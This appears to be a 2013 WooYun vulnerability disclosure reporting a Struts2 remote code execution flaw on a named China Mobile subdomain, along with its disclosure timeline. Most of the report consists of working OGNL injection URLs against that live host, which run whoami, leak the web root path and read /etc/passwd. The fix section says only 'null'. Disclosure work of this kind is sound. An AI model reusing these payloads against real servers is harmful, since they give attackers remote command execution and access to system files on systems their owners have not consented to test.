wybug_title: 中国移动某分站存在Struts2远程代码执行漏洞
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2013-07-19：	细节已通知厂商并且等待厂商处理中									2013-07-23：	厂商已经确认，细节仅向厂商公开									2013-08-02：	细节向核心白帽子及相关领域专家公开									2013-08-12：	细节向普通白帽子公开									2013-08-22：	细节向实习白帽子公开									2013-09-02：	细节向公众公开  简要描述： 中国移动某分站存在strusts远程代码执行漏洞，可远程执行命令，获取shell 详细说明：  漏洞产生地址：http://poc.10086.cn/Provisioning/action/toWap.action利用EXP：查看权限http://poc.10086.cn/Provisioning/action/toWap.action?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'whoami'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}获取网站绝对路径http://poc.10086.cn/Provisioning/action/toWap.action?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D查看/etc/passwd文件http://poc.10086.cn/Provisioning/action/toWap.action?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'cat','/etc/passwd'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}   漏洞证明：  查看权限

获取绝对路径

查看/etc/passwd文件

   修复方案：  null   版权声明：转载请注明来源 无人知晓@乌云
